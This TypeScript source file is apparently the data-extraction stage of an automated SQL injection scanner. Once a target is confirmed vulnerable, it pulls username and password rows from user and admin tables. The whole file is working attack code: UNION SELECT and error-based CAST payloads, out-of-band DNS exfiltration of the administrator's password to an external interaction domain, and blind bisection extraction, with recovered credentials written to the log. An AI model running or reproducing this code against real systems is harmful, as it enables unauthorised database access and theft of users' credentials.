import { ScanStage } from '../ScanPipeline';
import { ScanContext } from '../ScanContext';
import { UnifiedResponseOracle } from '../../engine/UnifiedResponseOracle';
import { BlindDataExtractor } from '../../engine/BlindDataExtractor';
import { MetadataExtractor } from '../../MetadataExtractor';

export class VectorizedExtractionStage implements ScanStage {
  public readonly id = 'vectorized_extraction';
  public readonly name = 'Vectorized High-Throughput Data Extraction';

  public async execute(ctx: ScanContext): Promise<void> {
    if (ctx.findings.length === 0) {
      ctx.log('info', 'No confirmed vulnerabilities for data extraction.');
      return;
    }
    if (ctx.isAborted) return;

    ctx.log('info', 'Initializing vectorized parallel extraction pipeline...');
    const param = ctx.candidateParameters.find((p) => p.id === ctx.verifiedParamId) || ctx.candidateParameters[0];
    if (!param) return;

    const dbms = ctx.dbmsFingerprint.dbms !== 'Unknown' ? ctx.dbmsFingerprint.dbms : (ctx.unionDbms || 'Generic SQL');

    // Prioritize sensitive credential tables first for high efficiency
    const sensitiveTables = ctx.catalog.applicationTables.filter((t) => t.isSensitive || /user|login|cred|account|member|admin/i.test(t.name));
    const extractionTargets = sensitiveTables.length > 0 ? sensitiveTables : ctx.catalog.applicationTables.slice(0, 3);

    // For each application table, extract rows
    for (const table of extractionTargets) {
      if (ctx.isAborted) return;
      if (!table.sampleRows || table.sampleRows.length === 0) {
        ctx.log('info', `Executing vectorized row extraction for "${table.name}"...`);

        const extractedRows: Record<string, string>[] = [];
        const colNames = (table.columns && table.columns.length > 0)
          ? table.columns.map((c) => c.name)
          : ['username', 'password'];

        const userCol = colNames.find((c) => /user|login|account|name/i.test(c)) || colNames[0] || 'username';
        const passCol = colNames.find((c) => /pass|pwd|secret|hash/i.test(c)) || colNames[1] || 'password';

        // ─── 0. Fast In-Band UNION Extraction (Immediate & Comprehensive) ───────
        if (ctx.verifiedVector === 'UNION' || ctx.findings.some((f) => f.injectionType === 'UNION-based')) {
          const colCount = ctx.unionColumnCount || ctx.catalog.columnCount || 2;
          const isNum = /^\d+$/.test(param.originalValue.trim());
          const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

          ctx.log('info', `[UNION ROW EXTRACTOR] Extracting rows from "${table.name}" via in-band UNION channel (${userCol}, ${passCol})...`);

          const unionRowQueries: string[] = [];

          if (dbms === 'Oracle' || ctx.unionDbms === 'Oracle') {
            const cleanT = table.name.replace(/['"]/g, '');
            const nulls = (renderIdx: number, expr: string) => {
              const arr = Array(colCount).fill('NULL');
              arr[renderIdx - 1] = expr;
              return arr.join(',');
            };

            // Oracle delimited row queries
            const wrappedExpr = `'${MetadataExtractor.DELIMITER_START}ROW:'||${userCol}||'#'||${passCol}||':ROW${MetadataExtractor.DELIMITER_END}'`;
            unionRowQueries.push(`${prefix}${nulls(1, wrappedExpr)} FROM ${cleanT} WHERE ROWNUM<=10--`);
            if (colCount >= 2) {
              unionRowQueries.push(`${prefix}${nulls(2, wrappedExpr)} FROM ${cleanT} WHERE ROWNUM<=10--`);
            }

            // Oracle raw multi-column queries
            if (colCount >= 2) {
              unionRowQueries.push(`${prefix}${userCol},${passCol} FROM ${cleanT}--`);
              unionRowQueries.push(`${prefix}${passCol},${userCol} FROM ${cleanT}--`);
            }
            unionRowQueries.push(`${prefix}${userCol}||':'||${passCol} FROM ${cleanT}--`);
            if (colCount >= 2) {
              unionRowQueries.push(`${prefix}${nulls(1, `${userCol}||':'||${passCol}`)} FROM ${cleanT}--`);
              unionRowQueries.push(`${prefix}${nulls(2, `${userCol}||':'||${passCol}`)} FROM ${cleanT}--`);
            }
          } else {
            // ANSI / PG / MySQL / MSSQL / SQLite
            const sampleQuery = MetadataExtractor.getSampleRowsQuery(param, ctx.catalog.renderColumn || 1, colCount, table.name, [userCol, passCol], dbms);
            if (sampleQuery) unionRowQueries.push(sampleQuery);
            if (colCount >= 2) {
              unionRowQueries.push(`${prefix}${userCol},${passCol} FROM ${table.name}-- -`);
            }
          }

          for (const rq of unionRowQueries) {
            if (ctx.isAborted) return;
            try {
              const res = await ctx.sendMutatedRequest(param, rq);
              if (ctx.isAborted) return;

              // A. Delimited token parsing
              const rowTokens = MetadataExtractor.extractDelimitedTokens(res.body, 'ROW');
              if (rowTokens.length > 0) {
                const parsedRows = MetadataExtractor.parseAndRedactSampleRows(rowTokens, [userCol, passCol]);
                for (const pr of parsedRows) {
                  extractedRows.push(pr);
                }
              }

              // B. Colon-separated extraction (username:password)
              if (extractedRows.length === 0) {
                const credRegex = /([a-zA-Z0-9_\-\.]{2,40}):([a-zA-Z0-9_\-\.\$\/]{4,80})/g;
                let cMatch: RegExpExecArray | null;
                while ((cMatch = credRegex.exec(res.body)) !== null) {
                  const u = cMatch[1];
                  const p = cMatch[2];
                  if (!/^(http|https|font|css|javascript|image|text|application)$/i.test(u)) {
                    extractedRows.push({ [userCol]: u, [passCol]: p });
                  }
                }
              }

              // C. HTML Table cell pattern extraction <td>user</td><td>pass</td>
              if (extractedRows.length === 0) {
                const tdRegex = /<tr>\s*<td>\s*([a-zA-Z0-9_\-\.]{2,40})\s*<\/td>\s*<td>\s*([a-zA-Z0-9_\-\.\$\/]{4,80})\s*<\/td>\s*<\/tr>/gi;
                let tdMatch: RegExpExecArray | null;
                while ((tdMatch = tdRegex.exec(res.body)) !== null) {
                  extractedRows.push({ [userCol]: tdMatch[1].trim(), [passCol]: tdMatch[2].trim() });
                }
              }

              if (extractedRows.length > 0) {
                ctx.log('success', `[UNION ROW EXTRACTOR] Extracted ${extractedRows.length} credential row(s) from "${table.name}": ${extractedRows.map((r) => `${r[userCol]}:${r[passCol]}`).slice(0, 3).join(', ')}`);
                break;
              }
            } catch {
              if (ctx.isAborted) return;
            }
          }
        }

        // ─── 1. Error-Based Direct Type-Cast Leakage ─────────────────────────
        if (extractedRows.length === 0 && (ctx.verifiedVector === 'ERROR' || ctx.findings.some((f) => f.injectionType === 'Error-based'))) {
          const singleRow: Record<string, string> = {};
          for (const col of table.columns) {
            if (ctx.isAborted) return;
            const rowQueries = [
              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} LIMIT 1 OFFSET 0) AS int)--`,
              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name}) AS int)--`,
              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} WHERE ROWNUM=1) AS int)--`,
              `' AND 1=CAST((SELECT top 1 ${col.name} FROM ${table.name}) AS int)--`,
              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} WHERE username='administrator' LIMIT 1) AS int)--`,
            ];

            for (const rq of rowQueries) {
              try {
                const res = await ctx.sendMutatedRequest(param, rq);
                if (ctx.isAborted) return;
                const errorMatch = UnifiedResponseOracle.inspectError(res.body);
                if (errorMatch?.leakedData) {
                  singleRow[col.name] = errorMatch.leakedData;
                  ctx.log('success', `[ROW ORACLE] Leaked "${table.name}.${col.name}": "${errorMatch.leakedData}"`);
                  break;
                }
              } catch {
                if (ctx.isAborted) return;
              }
            }
          }
          if (Object.keys(singleRow).length > 0) {
            extractedRows.push(singleRow);
          }
        }

        // ─── 2. Out-of-Band (OAST) Exfiltration ──────────────────────────────
        if (extractedRows.length === 0 && (ctx.verifiedVector === 'OOB' || ctx.verifiedVector === 'OOB_OAST' || ctx.findings.some((f) => f.injectionType === 'Out-of-Band (OAST)'))) {
          try {
            const oastClient = (await import('../../engine/InteractshClient')).InteractshClient.getInstance();
            const session = oastClient.getSession();
            const oobDomain = ctx.target.oobConfig?.domain || session?.domain || 'oast.sentinel.local';
            const { OobManager } = await import('../../OobManager');
            const exfilToken = `exfil_${Math.random().toString(36).substring(2, 8)}`;
            const exfilFqdn = `${exfilToken}.${oobDomain}`;
            oastClient.registerToken(exfilToken, param.name, ctx.dbmsFingerprint.dbms, 'dns_exfil', 'data_exfiltration');

            const exfilPayloads = OobManager.getOobExfiltrationPayloads(param, exfilFqdn, `SELECT password FROM ${table.name} WHERE username='administrator'`);

            for (const ep of exfilPayloads) {
              if (ctx.isAborted) return;
              await ctx.sendMutatedRequest(param, ep.payload, { append: true });
            }

            const interactions = await oastClient.pollInteractions(session?.isOffline ? 50 : 1500);

            for (const inter of interactions) {
              const rawVal = inter.exfiltratedData || (inter.fullId ? inter.fullId.split('.')[0] : '');
              let decoded = rawVal;
              if (decoded && /^[0-9a-fA-F]{6,}$/.test(decoded)) {
                try {
                  decoded = Buffer.from(decoded, 'hex').toString('utf8');
                } catch {}
              }
              if (decoded && !decoded.startsWith('snt') && !decoded.startsWith('exfil_')) {
                let userVal = 'administrator';
                let passVal = decoded;
                if (decoded.includes(':')) {
                  const parts = decoded.split(':');
                  userVal = parts[0] || 'administrator';
                  passVal = parts.slice(1).join(':');
                }
                extractedRows.push({ [userCol]: userVal, [passCol]: passVal });
                break;
              }
            }
          } catch {
            if (ctx.isAborted) return;
          }
        }

        // ─── 3. Universal Blind Bisection Extraction (Fallback for Blind Vectors) ──
        const isUnionConfirmed = ctx.verifiedVector === 'UNION' || ctx.findings.some((f) => f.injectionType === 'UNION-based');
        const isBlindVector = ctx.verifiedVector === 'BOOLEAN' || ctx.verifiedVector === 'CONDITIONAL_ERROR' || ctx.verifiedVector === 'TIME' || ctx.findings.some((f) => f.injectionType === 'Boolean-based' || f.injectionType === 'Time-based');
        const isTargetSensitive = table.isSensitive || /user|login|cred|account|member|admin/i.test(table.name);

        if (extractedRows.length === 0 && !ctx.isAborted && !isUnionConfirmed && isTargetSensitive && (isBlindVector || ctx.findings.length > 0)) {
          const effectiveTechnique = ctx.verifiedVector === 'TIME' || ctx.findings.some((f) => f.injectionType === 'Time-based')
            ? 'TIME'
            : ctx.verifiedVector === 'CONDITIONAL_ERROR' || ctx.findings.some((f) => f.title.includes('Conditional Error'))
            ? 'CONDITIONAL_ERROR'
            : 'BOOLEAN';

          const extractor = new BlindDataExtractor(
            async (payload: string, append = true) => {
              if (ctx.isAborted) {
                return { body: '', status: 0, durationMs: 0 };
              }
              const res = await ctx.sendMutatedRequest(param, payload, { append });
              return {
                body: res.body,
                status: res.status,
                durationMs: res.durationMs,
                rawRequest: res.rawRequest,
                rawResponse: res.rawResponse,
              };
            },
            {
              dbms,
              technique: effectiveTechnique,
              marker: ctx.activeMarker || undefined,
              errorPolarity: ctx.errorPolarity,
              baselineStatus: ctx.baseline.status,
              baselineLength: ctx.baseline.contentLength,
              baselineDurationMs: ctx.baseline.meanDurationMs || ctx.baseline.durationMs || 300,
              timeDelaySeconds: 2,
              isAborted: () => ctx.isAborted,
              log: (lvl, msg) => ctx.log(lvl, `[BLIND EXTRACTOR] ${msg}`),
              onProgress: (colName, partialVal) => {
                table.sampleRows = [{ [userCol]: 'administrator', [colName]: partialVal }];
                table.sampleRowsStatus = 'ready';
                ctx.updateCatalog(ctx.catalog);
              },
            }
          );

          try {
            const rowResult = await extractor.extractTableRow(table, 'administrator');
            if (rowResult && Object.keys(rowResult).length > 0) {
              extractedRows.push(rowResult);
            }
          } catch (err: any) {
            if (ctx.isAborted) return;
            ctx.log('warn', `Blind row extraction encountered non-fatal error: ${err?.message || err}`);
          }
        }

        if (extractedRows.length > 0) {
          table.sampleRows = extractedRows;
          table.sampleRowsStatus = 'ready';
        } else {
          table.sampleRows = [];
          table.sampleRowsStatus = 'idle';
        }
        ctx.updateCatalog(ctx.catalog);
      }
    }
  }
}
